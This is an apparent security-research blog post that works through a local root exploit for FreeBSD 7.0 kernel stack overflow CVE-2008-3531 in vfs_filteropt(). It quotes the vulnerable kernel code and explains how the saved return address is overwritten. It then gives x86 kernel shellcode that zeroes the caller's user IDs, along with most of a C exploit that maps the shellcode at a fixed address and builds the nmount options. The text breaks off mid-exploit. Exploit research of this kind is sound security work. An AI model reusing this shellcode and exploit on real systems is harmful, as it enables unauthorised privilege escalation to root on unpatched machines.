---
id: 116
title: 'CVE-2008-3531: FreeBSD kernel stack overflow exploit development'
author: argp
layout: post
guid: http://argp.gr/blog/?p=116
permalink: /2009/07/04/cve-2008-3531-exploit/
aktt_notify_twitter:
  - no
categories:
  - exploitation
  - freebsd
  - kernel
  - research
  - security
tags:
  - code
  - exploit
  - exploitation
  - freebsd
  - kernel
  - research
  - security
---
About four months ago I developed a reliable exploit for vulnerability [CVE-2008-3531][1], which is also addressed in the advisory [FreeBSD-SA-08:08.nmount][2]. In this post I will use this vulnerability to provide an overview of the development process for FreeBSD kernel stack exploits.

CVE-2008-3531 is a kernel stack overflow vulnerability that affects FreeBSD versions 7.0-RELEASE and 7.0-STABLE, but not 7.1-RELEASE nor 7.1-STABLE as the CVE entry seems to suggest.

The bug is in function `vfs_filteropt()` at `src/sys/kern/vfs_mount.c`:

<div class="wp_syntax">
  <table>
    <tr>
      <td class="line_numbers">
        <pre>1800
1801
1802
1803
1804
1805
1806
1807
1808
1809
1810
1811
1812
1813
1814
1815
1816
1817
1818
1819
1820
1821
1822
1823
1824
1825
1826
1827
1828
1829
1830
1831
1832
1833
1834
1835
1836
1837
1838
1839
1840
1841
1842
1843
1844
1845
</pre>
      </td>
      
      <td class="code">
        <pre class="c" style="font-family:monospace;"><span style="color: #993333;">int</span>
vfs_filteropt<span style="color: #009900;">&#40;</span><span style="color: #993333;">struct</span> vfsoptlist <span style="color: #339933;">*</span>opts<span style="color: #339933;">,</span> <span style="color: #993333;">const</span> <span style="color: #993333;">char</span> <span style="color: #339933;">**</span>legal<span style="color: #009900;">&#41;</span>
<span style="color: #009900;">&#123;</span>
       <span style="color: #993333;">struct</span> vfsopt <span style="color: #339933;">*</span>opt<span style="color: #339933;">;</span>
       <span style="color: #993333;">char</span> errmsg<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">255</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">;</span>
       <span style="color: #993333;">const</span> <span style="color: #993333;">char</span> <span style="color: #339933;">**</span>t<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>p<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>q<span style="color: #339933;">;</span>
       <span style="color: #993333;">int</span> ret <span style="color: #339933;">=</span> <span style="color: #0000dd;"></span><span style="color: #339933;">;</span>
&nbsp;
       TAILQ_FOREACH<span style="color: #009900;">&#40;</span>opt<span style="color: #339933;">,</span> opts<span style="color: #339933;">,</span> link<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
               p <span style="color: #339933;">=</span> opt<span style="color: #339933;">-&gt;</span>name<span style="color: #339933;">;</span>
               q <span style="color: #339933;">=</span> NULL<span style="color: #339933;">;</span>
               <span style="color: #b1b100;">if</span> <span style="color: #009900;">&#40;</span>p<span style="color: #009900;">&#91;</span><span style="color: #0000dd;"></span><span style="color: #009900;">&#93;</span> <span style="color: #339933;">==</span> <span style="color: #ff0000;">'n'</span> <span style="color: #339933;">&&</span> p<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: #009900;">&#93;</span> <span style="color: #339933;">==</span> <span style="color: #ff0000;">'o'</span><span style="color: #009900;">&#41;</span>
                       q <span style="color: #339933;">=</span> p <span style="color: #339933;">+</span> <span style="color: #0000dd;">2</span><span style="color: #339933;">;</span>
               <span style="color: #b1b100;">for</span><span style="color: #009900;">&#40;</span>t <span style="color: #339933;">=</span> global_opts<span style="color: #339933;">;</span> <span style="color: #339933;">*</span>t <span style="color: #339933;">!=</span> NULL<span style="color: #339933;">;</span> t<span style="color: #339933;">++</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
                       <span style="color: #b1b100;">if</span> <span style="color: #009900;">&#40;</span><span style="color: #000066;">strcmp</span><span style="color: #009900;">&#40;</span><span style="color: #339933;">*</span>t<span style="color: #339933;">,</span> p<span style="color: #009900;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;"></span><span style="color: #009900;">&#41;</span>
                               <span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span>
                       <span style="color: #b1b100;">if</span> <span style="color: #009900;">&#40;</span>q <span style="color: #339933;">!=</span> NULL<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
                               <span style="color: #b1b100;">if</span> <span style="color: #009900;">&#40;</span><span style="color: #000066;">strcmp</span><span style="color: #009900;">&#40;</span><span style="color: #339933;">*</span>t<span style="color: #339933;">,</span> q<span style="color: #009900;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;"></span><span style="color: #009900;">&#41;</span>
                                       <span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span>
                       <span style="color: #009900;">&#125;</span>
               <span style="color: #009900;">&#125;</span>
               <span style="color: #b1b100;">if</span> <span style="color: #009900;">&#40;</span><span style="color: #339933;">*</span>t <span style="color: #339933;">!=</span> NULL<span style="color: #009900;">&#41;</span>
                       <span style="color: #b1b100;">continue</span><span style="color: #339933;">;</span>
               <span style="color: #b1b100;">for</span><span style="color: #009900;">&#40;</span>t <span style="color: #339933;">=</span> legal<span style="color: #339933;">;</span> <span style="color: #339933;">*</span>t <span style="color: #339933;">!=</span> NULL<span style="color: #339933;">;</span> t<span style="color: #339933;">++</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
                       <span style="color: #b1b100;">if</span> <span style="color: #009900;">&#40;</span><span style="color: #000066;">strcmp</span><span style="color: #009900;">&#40;</span><span style="color: #339933;">*</span>t<span style="color: #339933;">,</span> p<span style="color: #009900;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;"></span><span style="color: #009900;">&#41;</span>
                               <span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span>
                       <span style="color: #b1b100;">if</span> <span style="color: #009900;">&#40;</span>q <span style="color: #339933;">!=</span> NULL<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
                               <span style="color: #b1b100;">if</span> <span style="color: #009900;">&#40;</span><span style="color: #000066;">strcmp</span><span style="color: #009900;">&#40;</span><span style="color: #339933;">*</span>t<span style="color: #339933;">,</span> q<span style="color: #009900;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;"></span><span style="color: #009900;">&#41;</span>
                                       <span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span>
                       <span style="color: #009900;">&#125;</span>
               <span style="color: #009900;">&#125;</span>
               <span style="color: #b1b100;">if</span> <span style="color: #009900;">&#40;</span><span style="color: #339933;">*</span>t <span style="color: #339933;">!=</span> NULL<span style="color: #009900;">&#41;</span>
                       <span style="color: #b1b100;">continue</span><span style="color: #339933;">;</span>
               <span style="color: #000066;">sprintf</span><span style="color: #009900;">&#40;</span>errmsg<span style="color: #339933;">,</span> <span style="color: #ff0000;">"mount option &lt;%s&gt; is unknown"</span><span style="color: #339933;">,</span> p<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
               <span style="color: #000066;">printf</span><span style="color: #009900;">&#40;</span><span style="color: #ff0000;">"%s<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: #339933;">,</span> errmsg<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
               ret <span style="color: #339933;">=</span> EINVAL<span style="color: #339933;">;</span>
       <span style="color: #009900;">&#125;</span>
       <span style="color: #b1b100;">if</span> <span style="color: #009900;">&#40;</span>ret <span style="color: #339933;">!=</span> <span style="color: #0000dd;"></span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
               TAILQ_FOREACH<span style="color: #009900;">&#40;</span>opt<span style="color: #339933;">,</span> opts<span style="color: #339933;">,</span> link<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
                       <span style="color: #b1b100;">if</span> <span style="color: #009900;">&#40;</span><span style="color: #000066;">strcmp</span><span style="color: #009900;">&#40;</span>opt<span style="color: #339933;">-&gt;</span>name<span style="color: #339933;">,</span> <span style="color: #ff0000;">"errmsg"</span><span style="color: #009900;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;"></span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
                           <span style="color: #000066;">strncpy</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#40;</span><span style="color: #993333;">char</span> <span style="color: #339933;">*</span><span style="color: #009900;">&#41;</span>opt<span style="color: #339933;">-&gt;</span>value<span style="color: #339933;">,</span> errmsg<span style="color: #339933;">,</span> opt<span style="color: #339933;">-&gt;</span>len<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
                       <span style="color: #009900;">&#125;</span>
               <span style="color: #009900;">&#125;</span>
       <span style="color: #009900;">&#125;</span>
       <span style="color: #b1b100;">return</span> <span style="color: #009900;">&#40;</span>ret<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #009900;">&#125;</span></pre>
      </td>
    </tr>
  </table>
</div>

The first step of the exploit development process involves identifying the vulnerability&#8217;s conditions and assessing its impact.

In line 1833 `sprintf()` is used to write an error message to a locally declared static buffer, namely `errmsg` declared in line 1804 with a size of 255 bytes. The variable `p` used in `sprintf()` is a pointer to the mount option&#8217;s name. Conceptually a mount option is a tuple of the form (name, value). The vulnerable `sprintf()` call can be reached from userland when `p`&#8216;s (i.e. the mount option&#8217;s name) corresponding value is invalid, but not NULL (due to the checks performed in the first `TAILQ_FOREACH` loop). For example, the tuple (&#8220;AAAA&#8221;, &#8220;BBBB&#8221;) satisfies this condition; the mount option&#8217;s value is the string &#8220;BBBB&#8221; which is invalid and not NULL therefore `p` would point to the string &#8220;AAAA&#8221;. Both the mount option&#8217;s name (`p`) and the mount option&#8217;s value are user-controlled. This allows the overflow of the `errmsg` buffer by supplying a mount option name of arbitrary length and as we will see below, less importantly in this case, arbitrary content. Since `errmsg` is on a kernel stack, we can use the overflow to corrupt the current stack frame&#8217;s saved return address with the ultimate goal of diverting the kernel&#8217;s execution flow to code of our own choosing.

Now that we have explored the conditions and concluded that we can indeed achieve arbitrary code execution we have to explore the ways we can trigger the vulnerability. There are many possible execution paths to reach `vfs_filteropt()` from userland. After browsing FreeBSD&#8217;s file system stacking source code for a couple of minutes I decided to use the following:

`nmount() -> vfs_donmount() -> msdosfs_mount() -> vfs_filteropt()`

By default on FreeBSD the [`nmount(2)`][3] system call can only be called by root. In order for it to be enabled for unprivileged users the [`sysctl(8)`][4] variable `vfs.usermount` must be set to a non-zero value.

At this point we know that the vulnerability can potentially lead to arbitrary code execution and how to trigger it. The next step is to find a place to store our arbitrary code and divert the kernel&#8217;s execution flow to that memory address. Due to the structure of the format string used in the `sprintf()` call, we do not have direct control of the value that overwrites the saved return address in `vfs_filteropt()`&#8216;s kernel stack frame.

However, indirect control is more than enough to achieve arbitrary code execution. When `p` points to a string of 248 &#8216;A&#8217;s followed by NULL (i.e. 248 * &#8216;A&#8217; + &#8216;\0&#8217;) the saved return address is overwritten with the value 0x6e776f, that is the &#8220;nwo&#8221; of &#8220;unknown&#8221; in the `sprintf()`&#8216;s format string. Using the exploitation methodology of kernel NULL pointer dereference vulnerabilities, we can use [`mmap(2)`][5] to map memory at the page boundary 0x6e7000. Then we can place our arbitrary kernel shellcode 0x76f bytes after that. Therefore, when the corrupted saved return address with the value 0x6e776f is restored into the EIP register the kernel will execute our instructions that have been mapped to this address.

The next step in the exploit development process is to write these instructions. Specifically, our kernel shellcode should:

  * locate the credentials of the user that triggers the vulnerability and escalate his privileges,
  * ensure kernel continuation. In other words, the system must be kept in a running condition and stable after exploitation.

User credentials specifying the process owner&#8217;s privileges in FreeBSD are stored in a structure of type `ucred` defined at `src/sys/ucred.h`:

<div class="wp_syntax">
  <table>
    <tr>
      <td class="line_numbers">
        <pre>45
46
47
48
49
50
51
52
53
54
</pre>
      </td>
      
      <td class="code">
        <pre class="c" style="font-family:monospace;"><span style="color: #993333;">struct</span> ucred <span style="color: #009900;">&#123;</span>
    u_int   cr_ref<span style="color: #339933;">;</span>                 <span style="color: #808080; font-style: italic;">/* reference count */</span>
<span style="color: #339933;">#define cr_startcopy cr_uid</span>
    uid_t   cr_uid<span style="color: #339933;">;</span>                 <span style="color: #808080; font-style: italic;">/* effective user id */</span>
    uid_t   cr_ruid<span style="color: #339933;">;</span>                <span style="color: #808080; font-style: italic;">/* real user id */</span>
    uid_t   cr_svuid<span style="color: #339933;">;</span>               <span style="color: #808080; font-style: italic;">/* saved user id */</span>
    <span style="color: #993333;">short</span>   cr_ngroups<span style="color: #339933;">;</span>             <span style="color: #808080; font-style: italic;">/* number of groups */</span>
    gid_t   cr_groups<span style="color: #009900;">&#91;</span>NGROUPS<span style="color: #009900;">&#93;</span><span style="color: #339933;">;</span>     <span style="color: #808080; font-style: italic;">/* groups */</span>
    gid_t   cr_rgid<span style="color: #339933;">;</span>                <span style="color: #808080; font-style: italic;">/* real group id */</span>
    gid_t   cr_svgid<span style="color: #339933;">;</span>               <span style="color: #808080; font-style: italic;">/* saved group id */</span></pre>
      </td>
    </tr>
  </table>
</div>

A pointer to the `ucred` structure exists in a structure of type `proc` defined at `src/sys/proc.h`:

<div class="wp_syntax">
  <table>
    <tr>
      <td class="line_numbers">
        <pre>484
485
486
487
488
489
</pre>
      </td>
      
      <td class="code">
        <pre class="c" style="font-family:monospace;"><span style="color: #993333;">struct</span> proc <span style="color: #009900;">&#123;</span>
  LIST_ENTRY<span style="color: #009900;">&#40;</span>proc<span style="color: #009900;">&#41;</span> p_list<span style="color: #339933;">;</span>            <span style="color: #808080; font-style: italic;">/* (d) List of all processes. */</span>
  TAILQ_HEAD<span style="color: #009900;">&#40;</span><span style="color: #339933;">,</span> thread<span style="color: #009900;">&#41;</span> p_threads<span style="color: #339933;">;</span>     <span style="color: #808080; font-style: italic;">/* (j) all threads. */</span>
  TAILQ_HEAD<span style="color: #009900;">&#40;</span><span style="color: #339933;">,</span> kse_upcall<span style="color: #009900;">&#41;</span> p_upcalls<span style="color: #339933;">;</span> <span style="color: #808080; font-style: italic;">/* (j) All upcalls in the proc. */</span>
  <span style="color: #993333;">struct</span> mtx      p_slock<span style="color: #339933;">;</span>            <span style="color: #808080; font-style: italic;">/* process spin lock */</span>
  <span style="color: #993333;">struct</span> ucred    <span style="color: #339933;">*</span>p_ucred<span style="color: #339933;">;</span>           <span style="color: #808080; font-style: italic;">/* (c) Process owner's identity. */</span></pre>
      </td>
    </tr>
  </table>
</div>

The address of the `proc` structure can be dynamically located at runtime from unprivileged processes in a number of ways:

  * The [`sysctl(3)`][6] `kern.proc.pid` kernel interface and the `kinfo_proc` structure.
  * The `allproc` symbol that the FreeBSD kernel exports by default.
  * The `curthread` pointer from the `pcpu` structure (segment FS in kernel context points to it).

You can find more information about the first alternative in the [talk][7] I gave on FreeBSD kernel stack overflows at the University of Piraeus Software Libre Society, Event #16: Computer Security (unfortunately the slides from the talk are only available in Greek currently). The second alternative will be the subject of a future post. In the developed exploit I will use the third alternative.

The other task that our shellcode should perform is to maintain the stability of the system by ensuring the kernel&#8217;s continuation. One way to approach this would be to port Silvio Cesare&#8217;s &#8220;iret&#8221; return to userland approach (presented at his &#8220;Open source kernel auditing and exploitation&#8221; [Black Hat talk][8]) to FreeBSD. Although a full investigation of Silvio&#8217;s &#8220;iret&#8221; technique on FreeBSD would be very interesting, it is beyond the scope of this post.

In order to successfully return to userland from the kernel shellcode I will use another approach. Remember that the execution path I decided to take is `nmount() -> vfs_donmount() -> msdosfs_mount() -> vfs_filteropt()`. After the shellcode has performed privilege escalation it could return to where `vfs_filteropt()` was supposed to return, that is in `msdosfs_mount()`. However that is not possible since `msdosfs_mount()`&#8216;s saved registers have been corrupted when `vfs_filteropt()`&#8216;s stack frame was smashed by the overflow. The values of these saved registers cannot be restored, consequently there is no safe way to return to `msdosfs_mount()` after privilege escalation. The solution I have implemented in the exploit bypasses `msdosfs_mount()` completely and returns to the pre-previous from `vfs_filteropt()` function, namely `vfs_donmount()`. The saved registers&#8217; values of `vfs_donmount()` are uncorrupted in `msdosfs_mount()`&#8216;s stack frame. To make this more clear, consider the following pseudocode that is based on the relevant deadlisting part:

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="c" style="font-family:monospace;"><span style="color: #808080; font-style: italic;">/* this function's saved registers' values are uncorrupted */</span>
vfs_donmount<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span>
<span style="color: #009900;">&#123;</span>
    ...
    <span style="color: #202020;">msdosfs_mount</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
    ...
<span style="color: #009900;">&#125;</span>
&nbsp;
msdosfs_mount<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span>
<span style="color: #009900;">&#123;</span>
    ...
    <span style="color: #202020;">vfs_filteropt</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
    ...
    <span style="color: #808080; font-style: italic;">/* stack cleanup, restore saved registers */</span>
    addl    $<span style="color: #208080;">0xe8</span><span style="color: #339933;">,</span> <span style="color: #339933;">%</span>esp
    popl    <span style="color: #339933;">%</span>ebx
    popl    <span style="color: #339933;">%</span>esi
    popl    <span style="color: #339933;">%</span>edi
    popl    <span style="color: #339933;">%</span>ebp
    ret
<span style="color: #009900;">&#125;</span></pre>
      </td>
    </tr>
  </table>
</div>

Taking into consideration the above analysis, the complete kernel shellcode for the developed exploit is the following (you can download it from [here][9]):

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="asm" style="font-family:monospace;"><span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">global</span> _start
_start<span style="color: #339933;">:</span>
&nbsp;
movl    <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">fs</span><span style="color: #339933;">:</span><span style="color: #ff0000;"></span><span style="color: #339933;">,</span> <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">eax</span>         # get curthread
movl    <span style="color: #ff0000;">0x4</span><span style="color: #009900; font-weight: bold;">&#40;</span><span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #009900; font-weight: bold;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">eax</span>     # get proc from curthread
movl    <span style="color: #ff0000;">0x30</span><span style="color: #009900; font-weight: bold;">&#40;</span><span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #009900; font-weight: bold;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">eax</span>    # get ucred from proc
xorl    <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">ecx</span>          # <span style="color: #46aa03; font-weight: bold;">ecx</span> = <span style="color: #ff0000;"></span>
movl    <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0x4</span><span style="color: #009900; font-weight: bold;">&#40;</span><span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #009900; font-weight: bold;">&#41;</span>     # ucred<span style="color: #339933;">.</span>uid = <span style="color: #ff0000;"></span>
movl    <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0x8</span><span style="color: #009900; font-weight: bold;">&#40;</span><span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #009900; font-weight: bold;">&#41;</span>     # ucred<span style="color: #339933;">.</span>ruid = <span style="color: #ff0000;"></span>
&nbsp;
# return to the pre<span style="color: #339933;">-</span>previous function<span style="color: #339933;">,</span> i<span style="color: #339933;">.</span>e<span style="color: #339933;">.</span> vfs_donmount<span style="color: #009900; font-weight: bold;">&#40;</span><span style="color: #009900; font-weight: bold;">&#41;</span>
addl    <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">0xe8</span><span style="color: #339933;">,</span> <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">esp</span>
popl    <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">ebx</span>
popl    <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">esi</span>
popl    <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">edi</span>
popl    <span style="color: #339933;">%</span><span style="color: #46aa03; font-weight: bold;">ebp</span>
<span style="color: #00007f; font-weight: bold;">ret</span></pre>
      </td>
    </tr>
  </table>
</div>

Now we have a way to safely return from kernel to userland and ensure the continuation of the exploited system. The complete exploit is (you can download it from [here][10]):

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="c" style="font-family:monospace;"><span style="color: #339933;">#include &lt;sys/param.h&gt;</span>
<span style="color: #339933;">#include &lt;sys/mount.h&gt;</span>
<span style="color: #339933;">#include &lt;sys/uio.h&gt;</span>
<span style="color: #339933;">#include &lt;err.h&gt;</span>
<span style="color: #339933;">#include &lt;stdio.h&gt;</span>
<span style="color: #339933;">#include &lt;stdlib.h&gt;</span>
<span style="color: #339933;">#include &lt;string.h&gt;</span>
<span style="color: #339933;">#include &lt;sysexits.h&gt;</span>
<span style="color: #339933;">#include &lt;unistd.h&gt;</span>
<span style="color: #339933;">#include &lt;sys/types.h&gt;</span>
<span style="color: #339933;">#include &lt;sys/stat.h&gt;</span>
<span style="color: #339933;">#include &lt;sys/mman.h&gt;</span>
&nbsp;
<span style="color: #339933;">#define BUFSIZE     249</span>
&nbsp;
<span style="color: #339933;">#define PAGESIZE    4096</span>
<span style="color: #339933;">#define ADDR        0x6e7000</span>
<span style="color: #339933;">#define OFFSET      1903</span>
&nbsp;
<span style="color: #339933;">#define FSNAME      "msdosfs"</span>
<span style="color: #339933;">#define DIRPATH     "/tmp/msdosfs"</span>
&nbsp;
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> kernelcode<span style="color: #009900;">&#91;</span><span style="color: #009900;">&#93;</span> <span style="color: #339933;">=</span>
    <span style="color: #ff0000;">"<span style="color: #660099; font-weight: bold;">\x64</span><span style="color: #660099; font-weight: bold;">\xa1</span><span style="color: #660099; font-weight: bold;">\x00</span><span style="color: #660099; font-weight: bold;">\x00</span><span style="color: #660099; font-weight: bold;">\x00</span><span style="color: #660099; font-weight: bold;">\x00</span><span style="color: #660099; font-weight: bold;">\x8b</span><span style="color: #660099; font-weight: bold;">\x40</span><span style="color: #660099; font-weight: bold;">\x04</span><span style="color: #660099; font-weight: bold;">\x8b</span><span style="color: #660099; font-weight: bold;">\x40</span><span style="color: #660099; font-weight: bold;">\x30</span>"</span>
    <span style="color: #ff0000;">"<span style="color: #660099; font-weight: bold;">\x31</span><span style="color: #660099; font-weight: bold;">\xc9</span><span style="color: #660099; font-weight: bold;">\x89</span><span style="color: #660099; font-weight: bold;">\x48</span><span style="color: #660099; font-weight: bold;">\x04</span><span style="color: #660099; font-weight: bold;">\x89</span><span style="color: #660099; font-weight: bold;">\x48</span><span style="color: #660099; font-weight: bold;">\x08</span><span style="color: #660099; font-weight: bold;">\x81</span><span style="color: #660099; font-weight: bold;">\xc4</span><span style="color: #660099; font-weight: bold;">\xe8</span><span style="color: #660099; font-weight: bold;">\x00</span>"</span>
    <span style="color: #ff0000;">"<span style="color: #660099; font-weight: bold;">\x00</span><span style="color: #660099; font-weight: bold;">\x00</span><span style="color: #660099; font-weight: bold;">\x5b</span><span style="color: #660099; font-weight: bold;">\x5e</span><span style="color: #660099; font-weight: bold;">\x5f</span><span style="color: #660099; font-weight: bold;">\x5d</span><span style="color: #660099; font-weight: bold;">\xc3</span>"</span><span style="color: #339933;">;</span>
&nbsp;
<span style="color: #993333;">int</span>
main<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span>
<span style="color: #009900;">&#123;</span>
    <span style="color: #993333;">void</span> <span style="color: #339933;">*</span>vptr<span style="color: #339933;">;</span>
    <span style="color: #993333;">struct</span> iovec iov<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">6</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">;</span>
&nbsp;
    vptr <span style="color: #339933;">=</span> mmap<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#40;</span><span style="color: #993333;">void</span> <span style="color: #339933;">*</span><span style="color: #009900;">&#41;</span>ADDR<span style="color: #339933;">,</span> PAGESIZE<span style="color: #339933;">,</span> PROT_READ <span style="color: #339933;">|</span> PROT_WRITE<span style="color: #339933;">,</span>
            MAP_FIXED <span style="color: #339933;">|</span> MAP_ANON <span style="color: #339933;">|</span> MAP_PRIVATE<span style="color: #339933;">,</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: #339933;">,</span> <span style="color: #0000dd;"></span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
    <span style="color: #b1b100;">if</span><span style="color: #009900;">&#40;</span>vptr <span style="color: #339933;">==</span> MAP_FAILED<span style="color: #009900;">&#41;</span>
    <span style="color: #009900;">&#123;</span>
        <span style="color: #000066;">perror</span><span style="color: #009900;">&#40;</span><span style="color: #ff0000;">"mmap"</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
        <span style="color: #000066;">exit</span><span style="color: #009900;">&#40;</span>EXIT_FAILURE<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
    <span style="color: #009900;">&#125;</span>
&nbsp;
    vptr <span style="color: #339933;">+=</span> OFFSET<span style="color: #339933;">;</span>
    <span style="color: #000066;">printf</span><span style="color: #009900;">&#40;</span><span style="color: #ff0000;">"[*] vptr = 0x%.8x<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: #339933;">,</span> <span style="color: #009900;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">int</span><span style="color: #009900;">&#41;</span>vptr<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
    <span style="color: #000066;">memcpy</span><span style="color: #009900;">&#40;</span>vptr<span style="color: #339933;">,</span> kernelcode<span style="color: #339933;">,</span> <span style="color: #009900;">&#40;</span><span style="color: #993333;">sizeof</span><span style="color: #009900;">&#40;</span>kernelcode<span style="color: #009900;">&#41;</span> <span style="color: #339933;">-</span> <span style="color: #0000dd;">1</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
    mkdir<span style="color: #009900;">&#40;</span>DIRPATH<span style="color: #339933;">,</span> <span style="color: #208080;">0700</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
    iov<span style="color: #009900;">&#91;</span><span style="color: #0000dd;"></span><span style="color: #009900;">&#93;</span>.<span style="color: #202020;">iov_base</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">"fstype"</span><span style="color: #339933;">;</span>
    iov<span style="color: #009900;">&#91;</span><span style="color: #0000dd;"></span><span style="color: #009900;">&#93;</span>.<span style="color: #202020;">iov_len</span> <span style="color: #339933;">=</span> <span style="color: #000066;">strlen</span><span style="color: #009900;">&#40;</span>iov<span style="color: #009900;">&#91;</span><span style="color: #0000dd;"></span><span style="color: #009900;">&#93;</span>.<span style="color: #202020;">iov_base</span><span style="color: #009900;">&#41;</span> <span style="color: #339933;">+</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span>
&nbsp;
    iov<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: #009900;">&#93;</span>.<span style="color: #202020;">iov_base</span> <span style="color: #339933;">=</span> FSNAME<span style="color: #339933;">;</span>
    iov<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: #009900;">&#93;</span>.<span style="color: #202020;">iov_len</span> <span style="color: #339933;">=</span> <span style="color: #000066;">strlen</span><span style="color: #009900;">&#40;</span>iov<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: #009900;">&#93;</span>.<span style="color: #202020;">iov_base</span><span style="color: #009900;">&#41;</span> <span style="color: #339933;">+</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span>
&nbsp;
    iov<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">2</span><span style="color: #009900;">&#93;</span>.<span style="color: #202020;">iov_base</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">"fspath"</span><span style="color: #339933;">;</span>
    iov<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">2</span><span style="color: #009900;">&#93;</span>.<span style="color: #202020;">iov_len</span> <span style="color: #339933;">=</span> <span style="color: #000066;">strlen</span><span style="color: #009900;">&#40;</span>iov<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">2</span><span style="color: #009900;">&#93;</span>.<span style="color: #202020;">iov_base</span><span style="color: #009900;">&#41;</span> <span style="color: #339933;">+</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span>
&nbsp;
    iov<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">3</span><span style="color: #009900;">&#93;</span>.<span style="color: #202020;">iov_base</span> <span style="color: #339933;">=</span> DIRPATH<span style="color: #339933;">;</span>
    iov<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">3</span><span style="color: #009900;">&#93;</span>.<span style="color: #202020;">iov_len</span> <span style="color: #339933;">=</span> <span style="color: #000066;">strlen</span><span style="color: #009900;">&#40;</span>iov<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">3</span><span style="color: #009900;">&#93;</span>.<span style="color: #202020;">iov_base</span><span style="color: #009900;">&#41;</span> <span style="color: #339933;">+</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span>
&nbsp;
